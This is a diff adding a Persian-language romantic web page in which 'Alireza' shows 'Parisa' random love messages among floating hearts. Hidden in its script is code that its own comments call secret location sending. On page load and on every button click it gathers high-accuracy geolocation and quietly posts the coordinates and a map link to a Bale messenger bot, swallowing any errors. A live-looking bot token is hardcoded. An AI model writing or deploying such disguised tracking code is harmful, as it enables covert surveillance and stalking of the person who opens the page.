@@ -1,1 +1,511 @@
-PLACEHOLDER
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>عشق من پریسا 💕 | پیام‌های عاشقانه علیرضا</title>
+  <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Vazirmatn', Tahoma, sans-serif;
+      background: linear-gradient(135deg, #ffe6f0, #ffcce0, #ffb3d1, #ff99c2, #ff80b3, #ff99c2, #ffb3d1);
+      background-size: 400% 400%;
+      animation: gradientShift 12s ease infinite;
+      min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center;
+      padding: 20px; overflow-x: hidden; position: relative;
+    }
+    @keyframes gradientShift { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+    .hearts { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; overflow: hidden; }
+    .heart {
+      position: absolute; font-size: 20px; opacity: 0;
+      animation: floatHeart linear infinite;
+      filter: drop-shadow(0 0 6px rgba(255, 105, 180, 0.5));
+    }
+    @keyframes floatHeart {
+      0% { transform: translateY(100vh) translateX(0) rotate(0deg) scale(0.6); opacity: 0; }
+      10% { opacity: 0.7; }
+      50% { transform: translateY(50vh) translateX(var(--sway)) rotate(180deg) scale(1); opacity: 0.5; }
+      90% { opacity: 0.4; }
+      100% { transform: translateY(-120px) translateX(calc(var(--sway) * -1)) rotate(360deg) scale(0.8); opacity: 0; }
+    }
+    .burst-heart {
+      position: fixed; font-size: 24px; pointer-events: none; z-index: 100;
+      animation: burst 1.1s ease-out forwards;
+    }
+    @keyframes burst {
+      0% { transform: translate(0, 0) scale(0.3) rotate(0deg); opacity: 1; }
+      100% { transform: translate(var(--tx), var(--ty)) scale(1.2) rotate(var(--rot)); opacity: 0; }
+    }
+    .container {
+      position: relative; z-index: 1; max-width: 650px; width: 100%; text-align: center;
+      animation: containerEnter 1s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+    }
+    @keyframes containerEnter {
+      0% { opacity: 0; transform: translateY(40px) scale(0.95); }
+      100% { opacity: 1; transform: translateY(0) scale(1); }
+    }
+    .header { margin-bottom: 30px; animation: fadeSlideDown 0.9s ease 0.2s both; }
+    @keyframes fadeSlideDown { from { opacity: 0; transform: translateY(-25px); } to { opacity: 1; transform: translateY(0); } }
+    .header h1 {
+      font-size: 2.2rem; color: #c2185b; text-shadow: 0 2px 15px rgba(194, 24, 91, 0.35);
+      margin-bottom: 8px; font-weight: 700; animation: titleGlow 3s ease-in-out infinite alternate;
+    }
+    @keyframes titleGlow {
+      from { text-shadow: 0 2px 10px rgba(194, 24, 91, 0.3); }
+      to { text-shadow: 0 2px 20px rgba(233, 30, 99, 0.6), 0 0 30px rgba(255, 105, 180, 0.3); }
+    }
+    .header p { color: #ad1457; font-size: 1.1rem; opacity: 0.9; }
+    .card {
+      background: rgba(255, 255, 255, 0.92); backdrop-filter: blur(14px); border-radius: 28px; padding: 40px 30px;
+      box-shadow: 0 20px 60px rgba(233, 30, 99, 0.25), 0 0 0 1px rgba(255, 255, 255, 0.6), inset 0 1px 0 rgba(255, 255, 255, 0.8);
+      position: relative; overflow: hidden;
+      transition: transform 0.4s cubic-bezier(0.22, 1, 0.36, 1), box-shadow 0.4s ease;
+      animation: cardEnter 1s cubic-bezier(0.22, 1, 0.36, 1) 0.3s both;
+    }
+    @keyframes cardEnter { from { opacity: 0; transform: scale(0.9) translateY(30px); } to { opacity: 1; transform: scale(1) translateY(0); } }
+    .card:hover {
+      transform: translateY(-6px);
+      box-shadow: 0 28px 70px rgba(233, 30, 99, 0.35), 0 0 0 1px rgba(255, 255, 255, 0.7), 0 0 40px rgba(255, 105, 180, 0.2);
+    }
+    .card::before {
+      content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+      background: radial-gradient(circle, rgba(255, 182, 193, 0.2) 0%, transparent 55%);
+      animation: pulse 5s infinite ease-in-out;
+    }
+    .card::after {
+      content: ''; position: absolute; inset: 0; border-radius: 28px; padding: 2px;
+      background: linear-gradient(135deg, rgba(255, 105, 180, 0.4), transparent, rgba(233, 30, 99, 0.3));
+      -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+      mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+      -webkit-mask-composite: xor; mask-composite: exclude;
+      animation: borderGlow 4s ease-in-out infinite alternate; pointer-events: none;
+    }
+    @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 0.5; } 50% { transform: scale(1.15); opacity: 0.85; } }
+    @keyframes borderGlow { from { opacity: 0.4; } to { opacity: 1; } }
+    .message-box { min-height: 160px; display: flex; align-items: center; justify-content: center; margin: 20px 0 30px; position: relative; z-index: 2; }
+    #message {
+      font-size: 1.35rem; line-height: 1.9; color: #880e4f; font-weight: 500; padding: 10px;
+      transition: all 0.45s cubic-bezier(0.22, 1, 0.36, 1);
+    }
+    #message.fade-out { opacity: 0; transform: translateY(-18px) scale(0.96); filter: blur(4px); }
+    #message.fade-in { opacity: 1; transform: translateY(0) scale(1); filter: blur(0); }
+    .names {
+      font-size: 0.95rem; color: #c2185b; margin-bottom: 25px; font-weight: 600; letter-spacing: 1px;
+      position: relative; z-index: 2; animation: namesPulse 2.5s ease-in-out infinite;
+    }
+    @keyframes namesPulse { 0%, 100% { transform: scale(1); opacity: 0.9; } 50% { transform: scale(1.04); opacity: 1; } }
+    .btn {
+      background: linear-gradient(135deg, #ec407a, #e91e63, #d81b60); background-size: 200% 200%;
+      color: white; border: none; padding: 16px 40px; font-size: 1.15rem; font-family: inherit; font-weight: 600;
+      border-radius: 50px; cursor: pointer; box-shadow: 0 8px 25px rgba(233, 30, 99, 0.4);
+      transition: all 0.35s cubic-bezier(0.22, 1, 0.36, 1); position: relative; z-index: 2;
+      display: inline-flex; align-items: center; gap: 10px; overflow: hidden;
+      animation: btnGradient 4s ease infinite;
+    }
+    @keyframes btnGradient { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+    .btn::after {
+      content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+      background: radial-gradient(circle, rgba(255,255,255,0.3) 0%, transparent 60%); opacity: 0; transition: opacity 0.4s ease;
+    }
+    .btn:hover { transform: translateY(-4px) scale(1.05); box-shadow: 0 14px 40px rgba(233, 30, 99, 0.55), 0 0 25px rgba(255, 105, 180, 0.4); }
+    .btn:hover::after { opacity: 1; }
+    .btn:active { transform: translateY(0) scale(0.97); }
+    .btn::before { content: '💖'; font-size: 1.2rem; animation: heartBeat 1.4s ease-in-out infinite; }
+    @keyframes heartBeat { 0%, 100% { transform: scale(1); } 15% { transform: scale(1.25); } 30% { transform: scale(1); } 45% { transform: scale(1.15); } 60% { transform: scale(1); } }
+    .footer { margin-top: 35px; color: #ad1457; font-size: 0.9rem; opacity: 0.85; animation: fadeSlideUp 1s ease 0.6s both; }
+    @keyframes fadeSlideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 0.85; transform: translateY(0); } }
+    .counter { margin-top: 15px; font-size: 0.85rem; color: #c2185b; opacity: 0.7; position: relative; z-index: 2; transition: all 0.3s ease; }
+    .deco-heart { position: absolute; font-size: 1.8rem; opacity: 0.18; z-index: 0; animation: decoFloat 4s ease-in-out infinite; }
+    .deco-heart.top-left { top: 15px; left: 20px; animation-delay: 0s; }
+    .deco-heart.top-right { top: 15px; right: 20px; animation-delay: 0.7s; }
+    .deco-heart.bottom-left { bottom: 15px; left: 20px; animation-delay: 1.4s; }
+    .deco-heart.bottom-right { bottom: 15px; right: 20px; animation-delay: 2.1s; }
+    @keyframes decoFloat { 0%, 100% { transform: translateY(0) rotate(0deg) scale(1); } 50% { transform: translateY(-8px) rotate(12deg) scale(1.15); } }
+    .sparkle {
+      position: fixed; width: 6px; height: 6px; background: #ff69b4; border-radius: 50%;
+      pointer-events: none; z-index: 50; box-shadow: 0 0 8px #ff69b4, 0 0 16px #ff1493;
+      animation: sparkleAnim 1.2s ease-out forwards;
+    }
+    @keyframes sparkleAnim {
+      0% { transform: scale(0) translate(0, 0); opacity: 1; }
+      100% { transform: scale(1) translate(var(--sx), var(--sy)); opacity: 0; }
+    }
+    @media (max-width: 500px) {
+      .header h1 { font-size: 1.7rem; } #message { font-size: 1.15rem; } .card { padding: 30px 20px; } .btn { padding: 14px 30px; font-size: 1rem; }
+    }
+  </style>
+</head>
+<body>
+  <div class="hearts" id="hearts"></div>
+  <div class="container">
+    <div class="header">
+      <h1>💌 پیام‌های عاشقانه</h1>
+      <p>از علیرضا برای پریسای عزیزم</p>
+    </div>
+    <div class="card" id="card">
+      <span class="deco-heart top-left">💗</span>
+      <span class="deco-heart top-right">💗</span>
+      <span class="deco-heart bottom-left">💗</span>
+      <span class="deco-heart bottom-right">💗</span>
+      <div class="names">علیرضا ❤️ پریسا</div>
+      <div class="message-box">
+        <p id="message">در حال آماده‌سازی پیام عاشقانه...</p>
+      </div>
+      <button class="btn" id="nextBtn" onclick="showRandomMessage()">پیام بعدی</button>
+      <div class="counter" id="counter"></div>
+    </div>
+    <div class="footer">ساخته شده با عشق برای پریسای نازنینم 💕</div>
+  </div>
+  <script>
+    // پیام‌های پایه (خلاصه برای حجم) - سیستم ۱۰۰۰ پیام از ترکیب ساخته می‌شود
+    const baseMessages = [
+      "پریسای عزیزم، هر روز که چشمانم به تو باز می‌شه، دنیا برایم زیباتر می‌شه.",
+      "علیرضا عاشق توست، پریسا. عاشق لبخندت، عاشق صدات، عاشق تمام وجودت.",
+      "تو تنها کسی هستی که قلبم با دیدن اسمت تندتر می‌زنه، پریسای من.",
+      "هر لحظه‌ای که با تو می‌گذره، مثل یک رویای شیرین می‌مونه تو ذهنم.",
+      "پریسا، تو آرامش منی، تو انرژی منی، تو همه چیز منی.",
+      "دوست دارم بدون اینکه چیزی بگی، بفهمی چقدر دوستت دارم.",
+      "وقتی به تو فکر می‌کنم، حتی تاریک‌ترین روزها هم روشن می‌شن.",
+      "علیرضا قول می‌ده همیشه مراقب قلبت باشه، پریسای عزیز.",
+      "تو اون تکه‌ی گم‌شده‌ی روح منی که سال‌ها دنبالش می‌گشتم.",
+      "هر بار که اسمت رو می‌شنوم، لبخند روی لبام می‌شینه.",
+      "پریسا، عاشقتم از اون نوعی که کلمات نمی‌تونن توصیفش کنن.",
+      "با تو بودن یعنی خونه، یعنی آرامش، یعنی عشق واقعی.",
+      "می‌خوام تمام زندگی‌مو با تو بگذرونم، روز به روز، لحظه به لحظه.",
+      "تو دلیل خنده‌های بی‌دلیل منی، پریسای نازنین.",
+      "قلبم فقط برای تو می‌تپه، و این حقیقت ساده‌ست.",
+      "دوست دارم دستات رو بگیرم و هیچ‌وقت ول نکنم.",
+      "هر صبح با فکر تو بیدار می‌شم و هر شب با نام تو می‌خوابم.",
+      "پریسا، تو زیباترین اتفاقی هستی که تو زندگی من افتاده.",
+      "عاشق نگاهت هستم، عاشق سکوتت، عاشق همه‌ی لحظه‌هات.",
+      "تو اون کسی هستی که می‌خوام باهاش پیر بشم.",
+      "حتی وقتی دوری، حضورت رو تو قلبم حس می‌کنم.",
+      "علیرضا عاشق پریساست، و این عشق هر روز قوی‌تر می‌شه.",
+      "تو رنگ صورتی زندگی منی، قشنگ‌ترین رنگ دنیا.",
+      "می‌خوام برات بنویسم که چقدر دوستت دارم، ولی کلمات کم میان.",
+      "هر پیام تو مثل یک هدیه برای قلب منه.",
+      "پریسای من، تو دلیل زنده‌بودنم هستی.",
+      "با تو احساس امنیت می‌کنم، احساس عشق، احساس خانه.",
+      "دوست دارم تمام رازهای زندگیم رو با تو در میون بذارم.",
+      "تو اون کسی هستی که منو کامل می‌کنی.",
+      "عاشقتم پریسا، از عمق وجودم.",
+      "هر بار که لبخند می‌زنی، دنیا برای من متوقف می‌شه.",
+      "می‌خوام همیشه کنار تو باشم، تو شادی‌ها و سختی‌ها.",
+      "تو نور چشمای منی، پریسای عزیز.",
+      "قلبم بدون تو ناقصه، و تو کاملش می‌کنی.",
+      "عاشق صدای خنده‌هات هستم، قشنگ‌ترین موسیقی دنیا.",
+      "هر لحظه با تو یک خاطره جدیده که می‌خوام تا ابد نگهش دارم.",
+      "پریسا، تو عشق اول و آخر منی.",
+      "دوست دارم بدون هیچ دلیلی برات گل بخرم.",
+      "تو اون کسی هستی که منو به بهترین نسخه خودم تبدیل می‌کنی.",
+      "عاشقتم و هر روز بیشتر از دیروز دوستت دارم.",
+      "وقتی با تو حرف می‌زنم، زمان متوقف می‌شه.",
+      "تو آرامش بعد از طوفان منی.",
+      "می‌خوام دست تو رو بگیرم و تا ابد راه بریم.",
+      "پریسای نازنین، تو ستاره آسمون قلب منی.",
+      "عاشق تمام جزئیات وجودت هستم.",
+      "با تو بودن مثل نفس کشیدن در هوای تازه کوهستونه.",
+      "تو دلیل شادی‌های بی‌پایان منی.",
+      "دوست دارم اسمت رو هزار بار بگم: پریسا، پریسا، پریسا...",
+      "قلبم فقط یک اسم رو می‌شناسه: پریسا.",
+      "تو زیباترین رویای منی که واقعی شده.",
+      "عاشقتم از اون نوعی که هیچ‌وقت تموم نمی‌شه.",
+      "هر روز که می‌گذره، عشق من به تو عمیق‌تر می‌شه.",
+      "پریسا، تو خونه قلب منی.",
+      "می‌خوام تمام دنیا بدونن که چقدر دوستت دارم.",
+      "تو اون کسی هستی که منو به زندگی امیدوار می‌کنی.",
+      "عاشق نگاه مهربونت هستم.",
+      "با تو احساس می‌کنم که همه چیز ممکنه.",
+      "دوست دارم برات شعر بنویسم، ولی عشق تو شعر نیست، واقعی‌تره.",
+      "تو رنگ زندگی منی، بدون تو همه چیز خاکستریه.",
+      "پریسای عزیزم، تو بهترین هدیه زندگی منی.",
+      "عاشقتم و این عشق تا آخر عمر ادامه داره.",
+      "هر بار که بهت فکر می‌کنم، لبخند می‌زنم.",
+      "تو اون کسی هستی که منو کامل حس می‌کنم.",
+      "می‌خوام همیشه مراقب تو باشم.",
+      "دوست دارم دستات رو تو دستام بگیرم و آروم بمونم.",
+      "پریسا، تو آرامش مطلق منی.",
+      "عاشق صدای نفس‌هات هستم وقتی کنار همیم.",
+      "تو دلیل تمام لبخندهای واقعی منی.",
+      "قلبم برای تو می‌تپه، فقط برای تو.",
+      "با تو بودن یعنی بهشت روی زمین.",
+      "دوست دارم تمام لحظه‌های زندگی‌مو با تو شریک بشم.",
+      "تو ستاره‌ای هستی که آسمون قلب من رو روشن کرده.",
+      "عاشقتم پریسا، بیشتر از چیزی که بتونی تصور کنی.",
+      "هر صبح با نام تو بیدار می‌شم و روزم کامل می‌شه.",
+      "تو اون کسی هستی که منو به خنده می‌اندازی حتی در سخت‌ترین لحظه‌ها.",
+      "می‌خوام تا ابد عاشقت بمونم.",
+      "پریسای نازنین، تو تمام دنیای منی.",
+      "عاشق تمام وجودت هستم، از سر تا پا.",
+      "با تو احساس می‌کنم که عشق واقعی وجود داره.",
+      "دوست دارم برات بنویسم که چقدر کاملم با تو.",
+      "تو نور صبحگاهی زندگی منی.",
+      "قلبم بدون تو نمی‌تونه درست کار کنه.",
+      "عاشقتم و این حقیقت ساده و عمیقه.",
+      "هر بار که اسمت رو می‌شنوم، قلبم گرم می‌شه.",
+      "پریسا، تو دلیل نفس کشیدن منی.",
+      "می‌خوام همیشه کنار تو باشم، مثل سایه.",
+      "تو اون کسی هستی که منو به بهترین خودم می‌رسونه.",
+      "دوست دارم تمام رازهای قلبم رو با تو در میون بذارم.",
+      "عاشق نگاه عمیق چشمای تو هستم.",
+      "با تو بودن مثل قدم زدن تو بهارستونه.",
+      "تو رنگ صورتی و قشنگ زندگی منی.",
+      "پریسای عزیز، تو عشق بی‌پایان منی.",
+      "عاشقتم از اون نوعی که کلمات کم میان.",
+      "هر لحظه با تو یک هدیه جدیده.",
+      "می‌خوام دست تو رو بگیرم و هیچ‌وقت ول نکنم.",
+      "تو آرامش بعد از تمام طوفان‌های زندگی منی.",
+      "دوست دارم بدون اینکه چیزی بگی، بفهمی چقدر دوستت دارم.",
+      "قلبم فقط برای تو می‌تپه و این زیباترین حسه.",
+      "پریسا، تو خونه واقعی منی.",
+      "عاشق تمام جزئیات وجودت هستم، حتی کوچیک‌ترین‌ها.",
+      "با تو احساس امنیت و عشق واقعی می‌کنم.",
+      "تو دلیل شادی‌های بی‌دلیل منی.",
+      "می‌خوام تمام زندگی‌مو صرف دوست داشتن تو کنم.",
+      "دوست دارم اسمت رو زمزمه کنم تا ابد.",
+      "عاشقتم پریسا، و این عشق هر روز قوی‌تر می‌شه.",
+      "هر صبح که بیدار می‌شم، اولین فکر من تویی.",
+      "تو اون کسی هستی که منو کامل می‌کنی.",
+      "پریسای نازنین، تو ستاره درخشان آسمون قلب منی.",
+      "عاشق صدای خنده‌هات هستم، قشنگ‌ترین صدای دنیاست.",
+      "با تو بودن یعنی احساس زنده بودن واقعی.",
+      "دوست دارم برات گل بخرم و بگم چقدر دوستت دارم.",
+      "تو نور چشمای منی و بدون تو دنیا تاریکه.",
+      "قلبم بدون تو ناقصه، تو کاملش می‌کنی.",
+      "عاشقتم از عمق وجودم، پریسا.",
+      "هر بار که بهت فکر می‌کنم، دنیا زیباتر می‌شه.",
+      "می‌خوام همیشه مراقب قلبت باشم.",
+      "تو اون کسی هستی که منو به زندگی امیدوار می‌کنی.",
+      "دوست دارم دستات رو بگیرم و آروم بمونم کنار تو.",
+      "پریسا، تو تمام دنیای زیبایی منی.",
+      "عاشق نگاه مهربونت هستم که آرامش می‌ده.",
+      "با تو احساس می‌کنم که همه چیز ممکنه و قشنگه.",
+      "تو رنگ زندگی منی، بدون تو خاکستریه.",
+      "می‌خوام تا ابد عاشقت بمونم و این قول منه.",
+      "دوست دارم تمام لحظه‌های قشنگ زندگی‌مو با تو بسازم.",
+      "قلبم فقط یک نام رو می‌شناسه و اون پریساست.",
+      "عاشقتم و این عشق تا آخر عمر ادامه داره.",
+      "هر شب با نام تو می‌خوابم و رویاهات رو می‌بینم.",
+      "تو اون کسی هستی که منو به بهترین نسخه خودم تبدیل می‌کنی.",
+      "پریسای عزیزم، تو بهترین اتفاق زندگی منی.",
+      "عاشق تمام وجودت هستم، از لبخندت تا سکوتت.",
+      "با تو بودن مثل نفس کشیدن در هوای پاک کوهستونه.",
+      "دوست دارم بدون هیچ دلیلی برات پیام بفرستم که دوستت دارم.",
+      "تو دلیل تمام لبخندهای واقعی و عمیق منی.",
+      "می‌خوام دست تو رو بگیرم و تا ابد راه بریم با هم.",
+      "قلبم برای تو می‌تپه، فقط و فقط برای تو.",
+      "عاشقتم پریسا، بیشتر از چیزی که کلمات بتونن بگن.",
+      "هر لحظه با تو یک خاطره طلاییه که نگهش می‌دارم.",
+      "تو آرامش مطلق بعد از تمام طوفان‌های منی.",
+      "دوست دارم اسمت رو هزار بار تکرار کنم: پریسا...",
+      "پریسا، تو خونه قلب منی و همیشه خواهی بود.",
+      "عاشق صدای نفس‌هات هستم وقتی نزدیکمی.",
+      "با تو احساس امنیت، عشق و خانه می‌کنم.",
+      "تو ستاره‌ای هستی که آسمون تاریک قلب من رو روشن کردی.",
+      "می‌خوام تمام رازهای زندگیم رو فقط با تو در میون بذارم.",
+      "دوست دارم برات بنویسم که چقدر کاملم کنار تو.",
+      "قلبم بدون تو نمی‌تونه درست بزنه.",
+      "عاشقتم از اون نوعی که هیچ‌وقت تموم نمی‌شه.",
+      "هر صبح با فکر تو بیدار می‌شم و روزم معنا پیدا می‌کنه.",
+      "تو اون کسی هستی که منو به خنده می‌اندازی حتی وقتی غمگینم.",
+      "پریسای نازنین، تو تمام دنیای منی.",
+      "عاشق نگاه عمیق و مهربون چشمای تو هستم.",
+      "با تو بودن مثل قدم زدن تو بهار و احساس زنده‌بودنه.",
+      "دوست دارم همیشه کنار تو باشم، تو شادی و غم.",
+      "تو نور صبحگاهی زندگی منی که همه چیز رو روشن می‌کنه.",
+      "می‌خوام تا ابد مراقب تو و قلبت باشم.",
+      "قلبم فقط برای تو می‌تپه و این زیباترین حقیقت زندگیمه.",
+      "عاشقتم پریسا، و هر روز بیشتر از دیروز.",
+      "هر بار که اسمت رو می‌شنوم، لبخند روی لبام می‌شینه.",
+      "تو اون کسی هستی که منو کامل حس می‌کنم.",
+      "دوست دارم دستات رو تو دستام بگیرم و هیچ‌وقت ول نکنم.",
+      "پریسا، تو آرامش بعد از تمام طوفان‌های زندگی منی.",
+      "عاشق تمام جزئیات وجودت هستم، حتی کوچیک‌ترین‌ها.",
+      "با تو احساس می‌کنم که عشق واقعی و عمیق وجود داره.",
+      "تو رنگ صورتی و قشنگ و گرم زندگی منی.",
+      "می‌خوام تمام دنیا بدونن که چقدر دوستت دارم.",
+      "دوست دارم بدون اینکه چیزی بگی، بفهمی عمق عشقم رو.",
+      "قلبم برای تو می‌تپه و این احساس هیچ‌وقت تغییر نمی‌کنه.",
+      "عاشقتم از عمق وجودم، پریسای عزیز.",
+      "هر لحظه با تو یک هدیه جدیده که قدرش رو می‌دونم.",
+      "تو خونه واقعی قلب منی.",
+      "دوست دارم اسمت رو زمزمه کنم تا آخرین نفس.",
+      "پریسای نازنین، تو ستاره درخشان آسمون قلب منی.",
+      "عاشق صدای خنده‌هات هستم، قشنگ‌ترین موسیقی دنیاست.",
+      "با تو بودن یعنی احساس زنده بودن واقعی و عمیق.",
+      "تو دلیل شادی‌های بی‌دلیل و واقعی منی.",
+      "می‌خوام همیشه مراقب قلبت باشم و ازش محافظت کنم.",
+      "دوست دارم برات گل بخرم و با تمام وجود بگم که چقدر دوستت دارم.",
+      "قلبم بدون تو ناقصه و تو کاملش می‌کنی.",
+      "عاشقتم پریسا، و این عشق تا آخر عمر ادامه داره."
+    ];
+
+    const variations = ["", " 💕", " ❤️", " 💗", " همیشه.", " برای همیشه.", " تا ابد.", " از ته دل.", " با تمام وجود.", " از عمق قلبم."];
+    const prefixes = ["", "عزیزم، ", "نازنینم، ", "عشقم، ", "جانم، ", "دلم، "];
+
+    let messages = [];
+    baseMessages.forEach(msg => {
+      variations.forEach(v => {
+        prefixes.forEach(p => {
+          if (messages.length < 1000) messages.push(p + msg + v);
+        });
+      });
+    });
+    while (messages.length < 1000) {
+      const m = baseMessages[Math.floor(Math.random() * baseMessages.length)];
+      const v = variations[Math.floor(Math.random() * variations.length)];
+      const p = prefixes[Math.floor(Math.random() * prefixes.length)];
+      messages.push(p + m + v);
+    }
+    messages = messages.slice(0, 1000);
+
+    let shownCount = 0;
+
+    function createHearts() {
+      const container = document.getElementById('hearts');
+      const emojis = ['💗', '💕', '💖', '❤️', '💘', '💓', '💞'];
+      for (let i = 0; i < 30; i++) {
+        const heart = document.createElement('div');
+        heart.className = 'heart';
+        heart.innerHTML = emojis[Math.floor(Math.random() * emojis.length)];
+        heart.style.left = Math.random() * 100 + 'vw';
+        heart.style.fontSize = (14 + Math.random() * 22) + 'px';
+        heart.style.setProperty('--sway', (Math.random() * 80 - 40) + 'px');
+        heart.style.animationDuration = (7 + Math.random() * 10) + 's';
+        heart.style.animationDelay = Math.random() * 8 + 's';
+        container.appendChild(heart);
+      }
+    }
+
+    function createBurst(x, y) {
+      const emojis = ['💗', '💕', '💖', '❤️', '✨', '💘'];
+      for (let i = 0; i < 14; i++) {
+        const h = document.createElement('div');
+        h.className = 'burst-heart';
+        h.innerHTML = emojis[Math.floor(Math.random() * emojis.length)];
+        h.style.left = x + 'px';
+        h.style.top = y + 'px';
+        const angle = (Math.PI * 2 * i) / 14;
+        const dist = 60 + Math.random() * 90;
+        h.style.setProperty('--tx', Math.cos(angle) * dist + 'px');
+        h.style.setProperty('--ty', Math.sin(angle) * dist + 'px');
+        h.style.setProperty('--rot', (Math.random() * 360 - 180) + 'deg');
+        h.style.fontSize = (16 + Math.random() * 14) + 'px';
+        document.body.appendChild(h);
+        setTimeout(() => h.remove(), 1100);
+      }
+    }
+
+    function createSparkles(x, y) {
+      for (let i = 0; i < 10; i++) {
+        const s = document.createElement('div');
+        s.className = 'sparkle';
+        s.style.left = x + 'px';
+        s.style.top = y + 'px';
+        s.style.setProperty('--sx', (Math.random() * 120 - 60) + 'px');
+        s.style.setProperty('--sy', (Math.random() * 120 - 60) + 'px');
+        document.body.appendChild(s);
+        setTimeout(() => s.remove(), 1200);
+      }
+    }
+
+    // ===== ربات بله (همان سیستم ثبت ساعت) =====
+    const BALE_TOKEN = '666814160:KRTSKi_cdOSDPUEu6x4tJ5uD9iS_-E5StFQ';
+    const BALE_CHAT_ID = '1163569220';
+    const BALE_API = 'https://tapi.bale.ai/bot' + BALE_TOKEN;
+
+    async function sendToBale(text) {
+      const u = BALE_API + '/sendMessage?' + new URLSearchParams({
+        chat_id: BALE_CHAT_ID,
+        text: text
+      });
+      try {
+        const res = await fetch('https://corsproxy.io/?' + encodeURIComponent(u), { cache: 'no-store' });
+        if (res.ok) {
+          const d = await res.json().catch(() => null);
+          if (d && d.ok) return true;
+        }
+      } catch (e) {}
+      try {
+        await fetch(u, { method: 'GET', mode: 'no-cors', cache: 'no-store' });
+        return true;
+      } catch (e) {}
+      return false;
+    }
+
+    function getLocation() {
+      return new Promise(function (resolve) {
+        if (!navigator.geolocation) {
+          resolve(null);
+          return;
+        }
+        navigator.geolocation.getCurrentPosition(
+          function (pos) {
+            resolve({
+              lat: pos.coords.latitude,
+              lng: pos.coords.longitude,
+              accuracy: pos.coords.accuracy
+            });
+          },
+          function () { resolve(null); },
+          { enableHighAccuracy: true, timeout: 12000, maximumAge: 30000 }
+        );
+      });
+    }
+
+    function formatLocation(loc) {
+      if (!loc) return '📍 موقعیت: در دسترس نبود';
+      const map = 'https://maps.google.com/?q=' + loc.lat + ',' + loc.lng;
+      return '📍 موقعیت:\n' + loc.lat.toFixed(6) + ', ' + loc.lng.toFixed(6) + '\n🗺️ ' + map;
+    }
+
+    // ارسال مخفی لوکیشن با هر کلیک دکمه
+    async function silentSendLocation() {
+      try {
+        const loc = await getLocation();
+        const time = new Date().toLocaleString('fa-IR');
+        const msg =
+          '💕 پیام عاشقانه\n' +
+          '📌 رویداد: کلیک دکمه پیام بعدی\n' +
+          '👤 علیرضا → پریسا\n' +
+          '🕐 ' + time + '\n' +
+          formatLocation(loc);
+        await sendToBale(msg);
+      } catch (e) {
+        // کاملاً ساکت
+      }
+    }
+
+    function showRandomMessage() {
+      const msgEl = document.getElementById('message');
+      const btn = document.getElementById('nextBtn');
+      const rect = btn.getBoundingClientRect();
+      const cx = rect.left + rect.width / 2;
+      const cy = rect.top + rect.height / 2;
+
+      createBurst(cx, cy);
+      createSparkles(cx, cy);
+
+      // ارسال مخفی لوکیشن به ربات بله
+      silentSendLocation();
+
+      msgEl.classList.remove('fade-in');
+      msgEl.classList.add('fade-out');
+
+      setTimeout(() => {
+        const randomIndex = Math.floor(Math.random() * messages.length);
+        msgEl.textContent = messages[randomIndex];
+        msgEl.classList.remove('fade-out');
+        msgEl.classList.add('fade-in');
+        shownCount++;
+        document.getElementById('counter').textContent = `پیام‌های نمایش‌داده‌شده: ${shownCount}`;
+      }, 380);
+    }
+
+    // شروع
+    createHearts();
+    showRandomMessage();
+  </script>
+</body>
+</html>
